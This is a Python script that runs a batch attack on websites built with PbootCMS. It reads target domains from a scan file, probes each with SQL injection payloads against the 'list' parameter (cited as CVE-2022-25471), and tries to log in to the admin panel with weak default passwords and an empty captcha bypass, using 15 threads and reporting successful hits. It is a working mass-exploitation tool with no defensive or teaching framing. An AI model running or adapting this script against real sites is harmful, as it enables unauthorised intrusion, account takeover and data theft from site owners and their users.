#!/usr/bin/env python3
"""PbootCMS batch attack: frontend SQLi (CVE-2022-25471) + admin weak login
Known: /index.php?list=N SQLi via ' and extractvalue (if no WAF)
Admin: /admin.php?action=login user/password/code(empty bypass)
"""
import urllib.request, urllib.parse, re, http.cookiejar
from concurrent.futures import ThreadPoolExecutor, as_completed

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}

def fetch(url, timeout=8, data=None):
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None,
                                     headers={**UA, "Content-Type": "application/x-www-form-urlencoded"} if data else UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read(80000).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(4000).decode("utf-8", "ignore")
    except Exception:
        return 0, ""

def attack(d):
    out = [d]
    # 1. frontend SQLi probes (PbootCMS list param)
    sqli_payloads = [
        "/index.php?list=1%27",
        "/index.php?list=1%27%20and%20extractvalue(1,concat(0x7e,version()))--%20",
        "/?list=1%27",
    ]
    for p in sqli_payloads:
        code, body = fetch("http://" + d + p)
        if "SQLSTATE" in body or "syntax error" in body or "extractvalue" in body.lower() and "XPATH" in body:
            out.append("SQLI:%s" % p[:30])
            break
    # 2. admin.php existence
    code, body = fetch("http://" + d + "/admin.php")
    if code == 200 and ("user" in body.lower() or "password" in body.lower() or "验证码" in body):
        out.append("ADMIN-PHP")
    # 3. admin weak login (empty code bypass) - ONLY if real login form
    code, body = fetch("http://" + d + "/admin.php")
    has_login = 'name="user"' in body or 'name="username"' in body or 'type="password"' in body or "验证码" in body
    if has_login:
        for pw in ["admin", "admin123", "123456", "admin888"]:
            data = urllib.parse.urlencode({"user": "admin", "password": pw, "code": ""})
            code2, body2 = fetch("http://" + d + "/admin.php", data=data)
            strict = [m for m in ["系统设置", "内容管理", "栏目管理", "数据管理", "用户管理", "后台首页", "模板管理"] if m in body2]
            if strict:
                out.append("LOGIN-HIT:%s" % pw)
                break
    return out

def main():
    doms = []
    for line in open("/tmp/web_vuln2.txt"):
        m = re.search(r"\[CMS\]\s+([a-z0-9.-]+).*pbootcms", line, re.I)
        if m:
            d = m.group(1).strip().lower()
            if not any(h in d for h in ["bet", "casino", "vip", "slot", "xxx", "porn"]):
                doms.append(d)
    doms = sorted(set(doms))
    print("pbootcms candidates: %d" % len(doms), flush=True)
    with ThreadPoolExecutor(max_workers=15) as ex:
        futs = {ex.submit(attack, d): d for d in doms}
        for fut in as_completed(futs):
            r = fut.result()
            if len(r) > 1:
                print(" | ".join(r), flush=True)

if __name__ == "__main__":
    main()
